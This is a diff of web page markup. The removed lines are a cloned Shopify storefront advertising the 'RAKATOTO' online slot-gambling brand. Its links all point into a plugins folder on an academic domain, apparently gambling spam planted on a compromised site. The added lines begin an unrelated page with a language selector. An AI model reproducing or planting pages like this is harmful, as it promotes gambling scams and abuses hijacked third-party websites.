-          window.addEventListener('pagehide', handle_abandonment_event);
-        }
-      }());
-    </script>
-    <script id="web-pixels-manager-setup">
-      (function e(e, n, a, t, o, r, i) {
-        var s = null !== e,
-          l = ("function" == typeof BigInt && BigInt.toString().indexOf("[native code]") ? "modern" : "legacy").substring(0, 1),
-          c = t.substring(0, 1);
-        if (s) {
-          window.Shopify = window.Shopify || {};
-          var d = window.Shopify;
-          d.analytics = d.analytics || {};
-          var u = d.analytics;
-          u.replayQueue = [], u.publish = function(e, n, a) {
-            u.replayQueue.push([e, n, a])
-          };
-          try {
-            self.performance.mark("wpm:start")
-          } catch (e) {}
-        }
-        var p, f, y, h, v, m, w, g, b, _ = [a, "/wpm", "/", c, r, l, ".js"].join("");
-        f = (p = {
-          src: _,
-          async: !0,
-          onload: function() {
-            if (e) {
-              var a = window.webPixelsManager.init(e);
-              null == n || n(a);
-              var t = window.Shopify.analytics;
-              t.replayQueue.forEach((function(e) {
-                var n = e[0],
-                  t = e[1],
-                  o = e[2];
-                a.publishCustomEvent(n, t, o)
-              })), t.replayQueue = [], t.publish = a.publishCustomEvent, t.visitor = a.visitor
-            }
-          },
-          onerror: function() {
-            var n = (null == e ? void 0 : e.storefrontBaseUrl) ? e.storefrontBaseUrl.replace(/\/$/, "") : self.location.origin,
-              a = "".concat(n, "/.well-known/shopify/monorail/unstable/produce_batch"),
-              t = JSON.stringify({
-                metadata: {
-                  event_sent_at_ms: (new Date).getTime()
-                },
-                events: [{
-                  schema_id: "web_pixels_manager_load/2.0",
-                  payload: {
-                    version: o || "latest",
-                    page_url: self.location.href,
-                    status: "failed",
-                    error_msg: "".concat(_, " has failed to load")
-                  },
-                  metadata: {
-                    event_created_at_ms: (new Date).getTime()
-                  }
-                }]
-              });
-            try {
-              if (self.navigator.sendBeacon.bind(self.navigator)(a, t)) return !0
-            } catch (e) {}
-            var r = new XMLHttpRequest;
-            try {
-              return r.open("POST", a, !0), r.setRequestHeader("Content-Type", "text/plain"), r.send(t), !0
-            } catch (e) {
-              console && console.warn && console.warn("[Web Pixels Manager] Got an unhandled error while logging a load error.")
-            }
-            return !1
-          }
-        }).src, y = p.async, h = void 0 === y || y, v = p.onload, m = p.onerror, w = document.createElement("script"), g = document.head, b = document.body, w.async = h, w.src = f, v && w.addEventListener("load", v), m && w.addEventListener("error", m), g ? g.appendChild(w) : b ? b.appendChild(w) : console.error("Did not find a head or body element to append the script")
-      })({
-        shopId: 59231698991,
-        storefrontBaseUrl: "https://iili.io/JRKigR4.md.jpg",
-        cdnBaseUrl: "https://iili.io/JRKigR4.md.jpg/cdn",
-        surface: "storefront-renderer",
-        enabledBetaFlags: ["web_pixels_async_pixel_refactor", "web_pixels_visitor_api", "web_pixels_manager_performance_improvement"],
-        webPixelsConfigList: [{
-          "id": "shopify-app-pixel",
-          "configuration": "{}",
-          "eventPayloadVersion": "v1",
-          "runtimeContext": "STRICT",
-          "scriptVersion": "0570",
-          "apiClientId": "shopify-pixel",
-          "type": "APP"
-        }, {
-          "id": "shopify-custom-pixel",
-          "eventPayloadVersion": "v1",
-          "runtimeContext": "LAX",
-          "scriptVersion": "0570",
-          "apiClientId": "shopify-pixel",
-          "type": "CUSTOM"
-        }],
-        initData: {
-          "cart": null,
-          "checkout": null,
-          "customer": null,
-          "productVariants": [{
-            "id": "41888959627311",
-            "image": {
-              "src": "https://iili.io/JRKigR4.md.jpg"
-            },
-            "price": {
-              "amount": 2500000.0,
-              "currencyCode": "IDR"
-            },
-            "product": {
-              "id": "7362949021743",
-              "title": "DewaRaja88 \ud83c\udfb0 Link Situs RAKATOTO Hari Ini Gampang Menang Maxwin",
-              "untranslatedTitle": "DewaRaja88 \ud83c\udfb0 Link Situs RAKATOTO Hari Ini Gampang Menang Maxwin",
-              "url": "\/products\/lsxgacor",
-              "vendor": "RAKATOTO",
-              "type": "RAKATOTO"
-            },
-            "sku": "",
-            "title": "Default Title",
-            "untranslatedTitle": "Default Title"
-          }]
-        },
-      }, function pageEvents(webPixelsManagerAPI) {
-        webPixelsManagerAPI.publish("page_viewed");
-        webPixelsManagerAPI.publish("product_viewed", {
-          "productVariant": {
-            "id": "41888959627311",
-            "image": {
-              "src": "https://iili.io/JRKigR4.md.jpg"
-            },
-            "price": {
-              "amount": 2500000.0,
-              "currencyCode": "IDR"
-            },
-            "product": {
-              "id": "7362949021743",
-              "title": "DewaRaja88 \ud83c\udfb0 Link Situs RAKATOTO Hari Ini Gampang Menang Maxwin",
-              "untranslatedTitle": "DewaRaja88 \ud83c\udfb0 Link Situs RAKATOTO Hari Ini Gampang Menang Maxwin",
-              "url": "\/products\/lsxgacor",
-              "vendor": "RAKATOTO",
-              "type": "RAKATOTO"
-            },
-            "sku": "",
-            "title": "Default Title",
-            "untranslatedTitle": "Default Title"
-          }
-        });
-      }, "https://iili.io/JRKigR4.md.jpg/cdn", "browser", "0.0.404", "a9733732w152bc0c4p2b177b68md647b1e6", ["web_pixels_async_pixel_refactor", "web_pixels_visitor_api", "web_pixels_manager_performance_improvement"]);
-    </script>
-    <script>
-      window.ShopifyAnalytics = window.ShopifyAnalytics || {};
-      window.ShopifyAnalytics.meta = window.ShopifyAnalytics.meta || {};
-      window.ShopifyAnalytics.meta.currency = 'IDR';
-      var meta = {
-        "product": {
-          "id": 7362949021743,
-          "gid": "gid:\/\/shopify\/Product\/7362949021743",
-          "vendor": "RAKATOTO",
-          "type": "RAKATOTO",
-          "variants": [{
-            "id": 41888959627311,
-            "price": 250000000,
-            "name": "RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000",
-            "public_title": null,
-            "sku": ""
-          }]
-        },
-        "page": {
-          "pageType": "product",
-          "resourceType": "product",
-          "resourceId": 7362949021743
-        }
-      };
-      for (var attr in meta) {
-        window.ShopifyAnalytics.meta[attr] = meta[attr];
-      }
-    </script>
-    <script>
-      window.ShopifyAnalytics.merchantGoogleAnalytics = function() {};
-    </script>
-    <script class="analytics">
-      (function() {
-        var customDocumentWrite = function(content) {
-          var jquery = null;
-          if (window.jQuery) {
-            jquery = window.jQuery;
-          } else if (window.Checkout && window.Checkout.$) {
-            jquery = window.Checkout.$;
-          }
-          if (jquery) {
-            jquery('body').append(content);
-          }
-        };
-        var hasLoggedConversion = function(token) {
-          if (token) {
-            return document.cookie.indexOf('loggedConversion=' + token) !== -1;
-          }
-          return false;
-        }
-        var setCookieIfConversion = function(token) {
-          if (token) {
-            var twoMonthsFromNow = new Date(Date.now());
-            twoMonthsFromNow.setMonth(twoMonthsFromNow.getMonth() + 2);
-            document.cookie = 'loggedConversion=' + token + '; expires=' + twoMonthsFromNow;
-          }
-        }
-        var trekkie = window.ShopifyAnalytics.lib = window.trekkie = window.trekkie || [];
-        if (trekkie.integrations) {
-          return;
-        }
-        trekkie.methods = ['identify', 'page', 'ready', 'track', 'trackForm', 'trackLink'];
-        trekkie.factory = function(method) {
-          return function() {
-            var args = Array.prototype.slice.call(arguments);
-            args.unshift(method);
-            trekkie.push(args);
-            return trekkie;
-          };
-        };
-        for (var i = 0; i < trekkie.methods.length; i++) {
-          var key = trekkie.methods[i];
-          trekkie[key] = trekkie.factory(key);
-        }
-        trekkie.load = function(config) {
-          trekkie.config = config || {};
-          trekkie.config.initialDocumentCookie = document.cookie;
-          var first = document.getElementsByTagName('script')[0];
-          var script = document.createElement('script');
-          script.type = 'text/javascript';
-          script.onerror = function(e) {
-            var scriptFallback = document.createElement('script');
-            scriptFallback.type = 'text/javascript';
-            scriptFallback.onerror = function(error) {
-              var Monorail = {
-                produce: function produce(monorailDomain, schemaId, payload) {
-                  var currentMs = new Date().getTime();
-                  var event = {
-                    schema_id: schemaId,
-                    payload: payload,
-                    metadata: {
-                      event_created_at_ms: currentMs,
-                      event_sent_at_ms: currentMs
-                    }
-                  };
-                  return Monorail.sendRequest("https://" + monorailDomain + "/v1/produce", JSON.stringify(event));
-                },
-                sendRequest: function sendRequest(endpointUrl, payload) {
-                  // Try the sendBeacon API
-                  if (window && window.navigator && typeof window.navigator.sendBeacon === 'function' && typeof window.Blob === 'function' && !Monorail.isIos12()) {
-                    var blobData = new window.Blob([payload], {
-                      type: 'text/plain'
-                    });
-                    if (window.navigator.sendBeacon(endpointUrl, blobData)) {
-                      return true;
-                    } // sendBeacon was not successful
-                  } // XHR beacon
-                  var xhr = new XMLHttpRequest();
-                  try {
-                    xhr.open('POST', endpointUrl);
-                    xhr.setRequestHeader('Content-Type', 'text/plain');
-                    xhr.send(payload);
-                  } catch (e) {
-                    console.log(e);
-                  }
-                  return false;
-                },
-                isIos12: function isIos12() {
-                  return window.navigator.userAgent.lastIndexOf('iPhone; CPU iPhone OS 12_') !== -1 || window.navigator.userAgent.lastIndexOf('iPad; CPU OS 12_') !== -1;
-                }
-              };
-              Monorail.produce('monorail-edge.shopifysvc.com', 'trekkie_storefront_load_errors/1.1', {
-                shop_id: 59231698991,
-                theme_id: 130538733615,
-                app_name: "storefront",
-                context_url: window.location.href,
-                source_url: "//0cc537-2.myshopify.com/cdn/s/trekkie.storefront.f33399a7b9d8c1007209860fbdd63bb24633ae9f.min.js"
-              });
-            };
-            scriptFallback.async = true;
-            scriptFallback.src = '//0cc537-2.myshopify.com/cdn/s/trekkie.storefront.f33399a7b9d8c1007209860fbdd63bb24633ae9f.min.js';
-            first.parentNode.insertBefore(scriptFallback, first);
-          };
-          script.async = true;
-          script.src = '//0cc537-2.myshopify.com/cdn/s/trekkie.storefront.f33399a7b9d8c1007209860fbdd63bb24633ae9f.min.js';
-          first.parentNode.insertBefore(script, first);
-        };
-        trekkie.load({
-          "Trekkie": {
-            "appName": "storefront",
-            "development": false,
-            "defaultAttributes": {
-              "shopId": 59231698991,
-              "isMerchantRequest": null,
-              "themeId": 130538733615,
-              "themeCityHash": "8442994870904162449",
-              "contentLanguage": "en",
-              "currency": "IDR"
-            },
-            "isServerSideCookieWritingEnabled": true,
-            "monorailRegion": "shop_domain"
-          },
-          "Session Attribution": {},
-          "S2S": {
-            "facebookCapiEnabled": false,
-            "source": "trekkie-storefront-renderer"
-          }
-        });
-        var loaded = false;
-        trekkie.ready(function() {
-          if (loaded) return;
-          loaded = true;
-          window.ShopifyAnalytics.lib = window.trekkie;
-          var originalDocumentWrite = document.write;
-          document.write = customDocumentWrite;
-          try {
-            window.ShopifyAnalytics.merchantGoogleAnalytics.call(this);
-          } catch (error) {};
-          document.write = originalDocumentWrite;
-          window.ShopifyAnalytics.lib.page(null, {
-            "pageType": "product",
-            "resourceType": "product",
-            "resourceId": 7362949021743
-          });
-          var match = window.location.pathname.match(/checkouts\/(.+)\/(thank_you|post_purchase)/)
-          var token = match ? match[1] : undefined;
-          if (!hasLoggedConversion(token)) {
-            setCookieIfConversion(token);
-            window.ShopifyAnalytics.lib.track("Viewed Product", {
-              "currency": "IDR",
-              "variantId": 41888959627311,
-              "productId": 7362949021743,
-              "productGid": "gid:\/\/shopify\/Product\/7362949021743",
-              "name": "RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000",
-              "price": "2500000.00",
-              "sku": "",
-              "brand": "RAKATOTO",
-              "variant": null,
-              "category": "RAKATOTO",
-              "nonInteraction": true
-            });
-            window.ShopifyAnalytics.lib.track("monorail:\/\/trekkie_storefront_viewed_product\/1.1", {
-              "currency": "IDR",
-              "variantId": 41888959627311,
-              "productId": 7362949021743,
-              "productGid": "gid:\/\/shopify\/Product\/7362949021743",
-              "name": "RAKATOTO - SLOT SERVER KOREA GAMPANG MAXWIN MIN DEPO 1000",
-              "price": "2500000.00",
-              "sku": "",
-              "brand": "RAKATOTO",
-              "variant": null,
-              "category": "RAKATOTO",
-              "nonInteraction": true,
-              "referer": "https:\/\/0cc537-2.myshopify.com\/products\/lsxgacor"
-            });
-          }
-        });
-        var eventsListenerScript = document.createElement('script');
-        eventsListenerScript.async = true;
-        eventsListenerScript.src = "//0cc537-2.myshopify.com/cdn/shopifycloud/shopify/assets/shop_events_listener-a7c63dba65ccddc484f77541dc8ca437e60e1e9e297fe1c3faebf6523a0ede9b.js";
-        document.getElementsByTagName('head')[0].appendChild(eventsListenerScript);
-      })();
-    </script>
-    <script class="boomerang">
-      (function() {
-        if (window.BOOMR && (window.BOOMR.version || window.BOOMR.snippetExecuted)) {
-          return;
-        }
-        window.BOOMR = window.BOOMR || {};
-        window.BOOMR.snippetStart = new Date().getTime();
-        window.BOOMR.snippetExecuted = true;
-        window.BOOMR.snippetVersion = 12;
-        window.BOOMR.application = "storefront-renderer";
-        window.BOOMR.themeName = "Dawn";
-        window.BOOMR.themeVersion = "12.0.0";
-        window.BOOMR.shopId = 59231698991;
-        window.BOOMR.themeId = 130538733615;
-        window.BOOMR.renderRegion = "gcp-us-central1";
-        window.BOOMR.url = "https://iili.io/JRKigR4.md.jpg/cdn/shopifycloud/boomerang/shopify-boomerang-1.0.0.min.js";
-        var where = document.currentScript || document.getElementsByTagName("script")[0];
-        var parentNode = where.parentNode;
-        var promoted = false;
-        var LOADER_TIMEOUT = 3000;
-
-        function promote() {
-          if (promoted) {
-            return;
-          }
-          var script = document.createElement("script");
-          script.id = "boomr-scr-as";
-          script.src = window.BOOMR.url;
-          script.async = true;
-          parentNode.appendChild(script);
-          promoted = true;
-        }
-
-        function iframeLoader(wasFallback) {
-          promoted = true;
-          var dom, bootstrap, iframe, iframeStyle;
-          var doc = document;
-          var win = window;
-          window.BOOMR.snippetMethod = wasFallback ? "if" : "i";
-          bootstrap = function(parent, scriptId) {
-            var script = doc.createElement("script");
-            script.id = scriptId || "boomr-if-as";
-            script.src = window.BOOMR.url;
-            BOOMR_lstart = new Date().getTime();
-            parent = parent || doc.body;
-            parent.appendChild(script);
-          };
-          if (!window.addEventListener && window.attachEvent && navigator.userAgent.match(/MSIE [67]./)) {
-            window.BOOMR.snippetMethod = "s";
-            bootstrap(parentNode, "boomr-async");
-            return;
-          }
-          iframe = document.createElement("IFRAME");
-          iframe.src = "about:blank";
-          iframe.title = "";
-          iframe.role = "presentation";
-          iframe.loading = "eager";
-          iframeStyle = (iframe.frameElement || iframe).style;
-          iframeStyle.width = 0;
-          iframeStyle.height = 0;
-          iframeStyle.border = 0;
-          iframeStyle.display = "none";
-          parentNode.appendChild(iframe);
-          try {
-            win = iframe.contentWindow;
-            doc = win.document.open();
-          } catch (e) {
-            dom = document.domain;
-            iframe.src = "javascript:var d=document.open();d.domain='" + dom + "';void(0);";
-            win = iframe.contentWindow;
-            doc = win.document.open();
-          }
-          if (dom) {
-            doc._boomrl = function() {
-              this.domain = dom;
-              bootstrap();
-            };
-            doc.write("<body onload='document._boomrl();'>");
-          } else {
-            win._boomrl = function() {
-              bootstrap();
-            };
-            if (win.addEventListener) {
-              win.addEventListener("load", win._boomrl, false);
-            } else if (win.attachEvent) {
-              win.attachEvent("onload", win._boomrl);
-            }
-          }
-          doc.close();
-        }
-        var link = document.createElement("link");
-        if (link.relList && typeof link.relList.supports === "function" && link.relList.supports("preload") && ("as" in link)) {
-          window.BOOMR.snippetMethod = "p";
-          link.href = window.BOOMR.url;
-          link.rel = "preload";
-          link.as = "script";
-          link.addEventListener("load", promote);
-          link.addEventListener("error", function() {
-            iframeLoader(true);
-          });
-          setTimeout(function() {
-            if (!promoted) {
-              iframeLoader(true);
-            }
-          }, LOADER_TIMEOUT);
-          BOOMR_lstart = new Date().getTime();
-          parentNode.appendChild(link);
-        } else {
-          iframeLoader(false);
-        }
-
-        function boomerangSaveLoadTime(e) {
-          window.BOOMR_onload = (e && e.timeStamp) || new Date().getTime();
-        }
-        if (window.addEventListener) {
-          window.addEventListener("load", boomerangSaveLoadTime, false);
-        } else if (window.attachEvent) {
-          window.attachEvent("onload", boomerangSaveLoadTime);
-        }
-        if (document.addEventListener) {
-          document.addEventListener("onBoomerangLoaded", function(e) {
-            e.detail.BOOMR.init({
-              ResourceTiming: {
-                enabled: true,
-                trackedResourceTypes: ["script", "img", "css"]
-              },
-            });
-            e.detail.BOOMR.t_end = new Date().getTime();
-          });
-        } else if (document.attachEvent) {
-          document.attachEvent("onpropertychange", function(e) {
-            if (!e) e = event;
-            if (e.propertyName === "onBoomerangLoaded") {
-              e.detail.BOOMR.init({
-                ResourceTiming: {
-                  enabled: true,
-                  trackedResourceTypes: ["script", "img", "css"]
-                },
-              });
-              e.detail.BOOMR.t_end = new Date().getTime();
-            }
-          });
-        }
-      })();
-    </script>
-  </head>
-  <body class="gradient"><a class="skip-to-content-link button visually-hidden" href="#MainContent"> Skip to content </a>
-    <!-- BEGIN sections: header-group -->
-    <div id="shopify-section-sections--15870902304815__announcement-bar" class="shopify-section shopify-section-group-header-group announcement-bar-section">
-      <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-slideshow.css?v=107725913939919748051700311605" rel="stylesheet" type="text/css" media="all" />
-      <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-slider.css?v=142503135496229589681700311605" rel="stylesheet" type="text/css" media="all" />
-      <div class="utility-bar color-background-1 gradient utility-bar--bottom-border">
-        <div class="page-width utility-bar__grid">
-          <div class="announcement-bar" role="region" aria-label="Announcement">
-            <p class="announcement-bar__message h5">
-              <span>RAKATOTO</span>
-            </p>
-          </div>
-          <div class="localization-wrapper"></div>
-        </div>
-      </div>
-    </div>
-    <div id="shopify-section-sections--15870902304815__header" class="shopify-section shopify-section-group-header-group section-header">
-      <link rel="stylesheet" href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-list-menu.css?v=151968516119678728991700311597" media="print" onload="this.media='all'">
-      <link rel="stylesheet" href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-search.css?v=165164710990765432851700311604" media="print" onload="this.media='all'">
-      <link rel="stylesheet" href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-menu-drawer.css?v=31331429079022630271700311599" media="print" onload="this.media='all'">
-      <link rel="stylesheet" href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-cart-notification.css?v=54116361853792938221700311593" media="print" onload="this.media='all'">
-      <link rel="stylesheet" href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-cart-items.css?v=145340746371385151771700311593" media="print" onload="this.media='all'">
-      <link rel="stylesheet" href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-price.css?v=70172745017360139101700311602" media="print" onload="this.media='all'">
-      <noscript>
-        <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-list-menu.css?v=151968516119678728991700311597" rel="stylesheet" type="text/css" media="all" />
-      </noscript>
-      <noscript>
-        <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-search.css?v=165164710990765432851700311604" rel="stylesheet" type="text/css" media="all" />
-      </noscript>
-      <noscript>
-        <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-menu-drawer.css?v=31331429079022630271700311599" rel="stylesheet" type="text/css" media="all" />
-      </noscript>
-      <noscript>
-        <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-cart-notification.css?v=54116361853792938221700311593" rel="stylesheet" type="text/css" media="all" />
-      </noscript>
-      <noscript>
-        <link href="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/component-cart-items.css?v=145340746371385151771700311593" rel="stylesheet" type="text/css" media="all" />
-      </noscript>
-      <style>
-        header-drawer {
-          justify-self: start;
-          margin-left: -1.2rem;
-        }
-
-        @media screen and (min-width: 990px) {
-          header-drawer {
-            display: none;
-          }
-        }
-
-        .menu-drawer-container {
-          display: flex;
-        }
-
-        .list-menu {
-          list-style: none;
-          padding: 0;
-          margin: 0;
-        }
-
-        .list-menu--inline {
-          display: inline-flex;
-          flex-wrap: wrap;
-        }
-
-        summary.list-menu__item {
-          padding-right: 2.7rem;
-        }
-
-        .list-menu__item {
-          display: flex;
-          align-items: center;
-          line-height: calc(1 + 0.3 / var(--font-body-scale));
-        }
-
-        .list-menu__item--link {
-          text-decoration: none;
-          padding-bottom: 1rem;
-          padding-top: 1rem;
-          line-height: calc(1 + 0.8 / var(--font-body-scale));
-        }
-
-        @media screen and (min-width: 750px) {
-          .list-menu__item--link {
-            padding-bottom: 0.5rem;
-            padding-top: 0.5rem;
-          }
-        }
-      </style>
-      <style data-shopify>
-        .header {
-          padding: 10px 3rem 10px 3rem;
-        }
-
-        .section-header {
-          position: sticky;
-          /* This is for fixing a Safari z-index issue. PR #2147 */
-          margin-bottom: 0px;
-        }
-
-        @media screen and (min-width: 750px) {
-          .section-header {
-            margin-bottom: 0px;
-          }
-        }
-
-        @media screen and (min-width: 990px) {
-          .header {
-            padding-top: 20px;
-            padding-bottom: 20px;
-          }
-        }
-      </style>
-      <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/details-disclosure.js?v=13653116266235556501700311608" defer="defer"></script>
-      <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/details-modal.js?v=25581673532751508451700311609" defer="defer"></script>
-      <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/cart-notification.js?v=133508293167896966491700311589" defer="defer"></script>
-      <script src="//0cc537-2.myshopify.com/cdn/shop/t/1/assets/search-form.js?v=133129549252120666541700311620" defer="defer"></script>
-      <svg xmlns="http://www.w3.org/2000/svg" class="hidden">
-        <symbol id="icon-search" viewbox="0 0 18 19" fill="none">
-          <path fill-rule="evenodd" clip-rule="evenodd" d="M11.03 11.68A5.784 5.784 0 112.85 3.5a5.784 5.784 0 018.18 8.18zm.26 1.12a6.78 6.78 0 11.72-.7l5.4 5.4a.5.5 0 11-.71.7l-5.41-5.4z" fill="currentColor" />
-        </symbol>
-        <symbol id="icon-reset" class="icon icon-close" fill="none" viewBox="0 0 18 18" stroke="currentColor">
-          <circle r="8.5" cy="9" cx="9" stroke-opacity="0.2" />
-          <path d="M6.82972 6.82915L1.17193 1.17097" stroke-linecap="round" stroke-linejoin="round" transform="translate(5 5)" />
-          <path d="M1.22896 6.88502L6.77288 1.11523" stroke-linecap="round" stroke-linejoin="round" transform="translate(5 5)" />
-        </symbol>
-        <symbol id="icon-close" class="icon icon-close" fill="none" viewBox="0 0 18 17">
-          <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
-        </symbol>
-      </svg>
-      <sticky-header data-sticky-type="on-scroll-up" class="header-wrapper color-background-1 gradient header-wrapper--border-bottom">
-        <header class="header header--middle-left header--mobile-center page-width header--has-menu">
-          <header-drawer data-breakpoint="tablet">
-            <details id="Details-menu-drawer-container" class="menu-drawer-container">
-              <summary class="header__icon header__icon--menu header__icon--summary link focus-inset" aria-label="Menu">
-                <span>
-                  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-hamburger" fill="none" viewBox="0 0 18 16">
-                    <path d="M1 .5a.5.5 0 100 1h15.71a.5.5 0 000-1H1zM.5 8a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1A.5.5 0 01.5 8zm0 7a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1a.5.5 0 01-.5-.5z" fill="currentColor">
-                  </svg>
-                  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="icon icon-close" fill="none" viewBox="0 0 18 17">
-                    <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
-                  </svg>
-                </span>
-              </summary>
-              <div id="menu-drawer" class="gradient menu-drawer motion-reduce color-background-1">
-                <div class="menu-drawer__inner-container">
-                  <div class="menu-drawer__navigation-container">
-                    <nav class="menu-drawer__navigation">
-                      <ul class="menu-drawer__menu has-submenu list-menu" role="list">
-                        <li>
-                          <a id="HeaderDrawer-home" href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/" class="menu-drawer__menu-item list-menu__item link link--text focus-inset"> Home </a>
-                        </li>
-                        <li>
-                          <a id="HeaderDrawer-catalog" href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/" class="menu-drawer__menu-item list-menu__item link link--text focus-inset"> Catalog </a>
-                        </li>
-                        <li>
-                          <a id="HeaderDrawer-contact" href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/" class="menu-drawer__menu-item list-menu__item link link--text focus-inset"> Contact </a>
-                        </li>
-                      </ul>
-                    </nav>
-                    <div class="menu-drawer__utility-links">
-                      <div class="menu-drawer__localization header-localization"></div>
-                      <ul class="list list-social list-unstyled" role="list"></ul>
-                    </div>
-                  </div>
+</head>
+<body style="background-color: #c0c0c0;;">
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WM7CR6W" height="0" width="0"
+            style="display: none; visibility: hidden"></iframe></noscript>
+    <div class="wrapper-block-content">
+        <div class="language-definition"
+            data-translations='{"bn":{"action":"চালিয়ে যান","description":"সাইট দেখতে আপনার পছন্দের ভাষা চয়ন করুন","title":"এই পেজটি বাংলায় পাওয়া যায়।"},"cn":{"action":"继续","description":"选择您的首选语言来查看网站","title":"此页面有中文。"},"de":{"action":"Fortsetzen","description":"Wählen Sie Ihre bevorzugte Sprache, um die Website anzuzeigen","title":"Diese Seite ist auf Deutsch verfügbar."},"en":{"action":"Continue","description":"Choose your preferred language to view the site","title":"This page is available in English."},"es":{"action":"Seguir","description":"Elija su idioma preferido para ver el sitio","title":"Esta página está disponible en español."},"fr":{"action":"Continuer","description":"Choisissez votre langue préférée pour voir le site","title":"Cette page est disponible en français."},"hi":{"action":"जारी रखें","description":"साइट देखने के लिए अपनी पसंदीदा भाषा चुनें","title":"यह पेज हिंदी में उपलब्ध है।"},"in":{"action":"Terus","description":"Pilih bahasa pilihan Anda untuk melihat situs","title":"Halaman ini tersedia dalam bahasa Indonesia."},"it":{"action":"Continua","description":"Scegli la tua lingua preferita per visualizzare il sito","title":"Questa pagina è disponibile in italiano."},"jp":{"action":"継続する","description":"サイトを表示するためにあなたの好みの言語を選択してください","title":"このページは日本語でご覧いただけます。"},"kr":{"action":"계속하다","description":"사이트를 보려면 원하는 언어를 선택하세요.","title":"이 페이지는 한국어로 제공됩니다."},"pt":{"action":"Continuar","description":"Escolha o seu idioma preferido para visualizar o site","title":"Esta página está disponível em português."},"ru":{"action":"Продолжить","description":"Выберите предпочтительный язык для просмотра сайта","title":"Эта страница доступна на русском языке."},"th":{"action":"ดำเนินการต่อ","description":"เลือกภาษาที่คุณต้องการเพื่อดูเว็บไซต์","title":"เพจนี้เป็นภาษาไทย"},"tr":{"action":"Devam et","description":"Siteyi görüntülemek için tercih ettiğiniz dili seçin","title":"Bu sayfa Türkçe olarak mevcuttur."},"vi":{"action":"Tiếp tục","description":"Chọn ngôn ngữ ưa thích của bạn để xem trang web","title":"Trang này có sẵn bằng tiếng Việt."}}'>
+            <div class="language-definition__wrapper" data-nosnippet="">
+                <div class="language-definition__triangle"></div>
+                <div class="language-definition__text-container" data-nosnippet="">
+                    <h3 class="language-definition__title" data-nosnippet="">
+                        This page is available in English.
+                    </h3>
+                    <span class="language-definition__description">Choose your preferred language to view the
+                        site</span>
                 </div>
-              </div>
-            </details>
-          </header-drawer>
-          <a href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/" class="header__heading-link link link--text focus-inset">
-            <span class="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/">RAKATOTO</span>
-          </a>
-          <nav class="header__inline-menu">
-            <ul class="list-menu list-menu--inline" role="list">
-              <li>
-                <a id="HeaderMenu-home" href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/" class="header__menu-item list-menu__item link link--text focus-inset">
-                  <span>Home</span>
-                </a>
-              </li>
-              <li>
-                <a id="HeaderMenu-catalog" href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/" class="header__menu-item list-menu__item link link--text focus-inset">
-                  <span>Catalog</span>
-                </a>
-              </li>
-              <li>
-                <a id="HeaderMenu-contact" href="https://stieganesha.ac.id/plugins/uplot/slotgacor/rakatoto/" class="header__menu-item list-menu__item link link--text focus-inset">
-                  <span>Contact</span>
-                </a>
-              </li>
-            </ul>
-          </nav>
-          <div class="header__icons header__icons--localization header-localization">
-            <div class="desktop-localization-wrapper"></div>
-            <details-modal class="header__search">
-              <details>
-                <summary class="header__icon header__icon--search header__icon--summary link focus-inset modal__toggle" aria-haspopup="dialog" aria-label="Search">
-                  <span>
-                    <svg class="modal__toggle-open icon icon-search" aria-hidden="true" focusable="false">
-                      <use href="#icon-search">
-                    </svg>
-                    <svg class="modal__toggle-close icon icon-close" aria-hidden="true" focusable="false">
-                      <use href="#icon-close">
-                    </svg>
-                  </span>
-                </summary>
-                <div class="search-modal modal__content gradient" role="dialog" aria-modal="true" aria-label="Search">
-                  <div class="modal-overlay"></div>
-                  <div class="search-modal__content search-modal__content-bottom" tabindex="-1">
-                    <predictive-search class="search-modal__form" data-loading-text="Loading...">
-                      <form action="/search" method="get" role="search" class="search search-modal__form">
-                        <div class="field">
-                          <input class="search__input field__input" id="Search-In-Modal" type="search" name="q" value="" placeholder="Search" role="combobox" aria-expanded="false" aria-owns="predictive-search-results" aria-controls="predictive-search-results" aria-haspopup="listbox" aria-autocomplete="list" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false">
-                          <label class="field__label" for="Search-In-Modal">Search</label>
-                          <input type="hidden" name="options[prefix]" value="last">
-                          <button type="reset" class="reset__button field__button hidden" aria-label="Clear search term">
